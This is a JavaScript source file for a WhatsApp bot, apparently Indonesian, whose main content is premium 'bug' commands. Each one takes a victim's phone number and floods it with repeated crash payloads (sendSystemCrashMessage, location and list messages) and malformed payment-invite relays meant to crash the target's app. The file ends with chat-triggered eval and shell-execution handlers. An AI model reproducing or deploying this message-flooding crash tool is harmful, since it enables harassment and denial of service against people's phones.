if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'spesialbug-v4': case 'spesialbug-v5': case 'vvipcrash-v1': case 'vvipcrash-v2': case 'vvipcrash-v3': 
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'spesialbug-v3': 
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case '🌷': case '🌹': case '🥀': case '💐': case '🌼': case '💙': case '🤎': case '💖': case '💛': case '🖤': 
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
sleep(999)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
sleep(999)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
sleep(999)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'dikasigma-v1': case 'dikasigma-v2': case 'dikasigma-v3': 
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'dikasigma-v4': case 'dikasigma-v5': 
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'dikagacor-v4': case 'dikagacor-v5': 
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(1000)
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(1000)
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await dikabot.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(1000)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'vvipcrash-v4': case 'vvipcrash-v5': case 'dikagacor-v3': 
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'spesialbug-v1': case 'spesialbug-v2': 
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'blok': case 'block':
if (!isCreator) return m.reply(global.spesialown)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
dikabot.updateBlockStatus(Pe, 'block')
replyz('Sukses block target')
break
//===================================
case 'unblok': case 'unblock':
if (!isCreator) return m.reply(global.spesialown)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
dikabot.updateBlockStatus(Pe, 'unblock')
replyz(`Sukses unblock target`)
break
//===================================
case 'cekbot': case 'cek': case 'bot': case 'test': case 'cekbot?': {
replyz(`${global.botname} *ready* bro! jangan lupa subscribe youtube @dikaid_tech`)
}
break
//===================================
default:
if (budy.startsWith('=>')) {
if (!isCreator) return replyz('*Only Dika Ganteng*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return replyz(bang)}
try {
replyz(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
replyz(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await replyz(evaled)
} catch (err) {
await replyz(String(err))
}
}
//===================================
if (budy.startsWith('$')) {
if (!isCreator) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return replyz(`${err}`)
if (stdout) return replyz(stdout)
})
}
//===================================
}
} catch (err) {
dikabot.sendMessage(m.chat, {text: require('util').format(err)}, {quoted: m})
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//===================================
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//===================================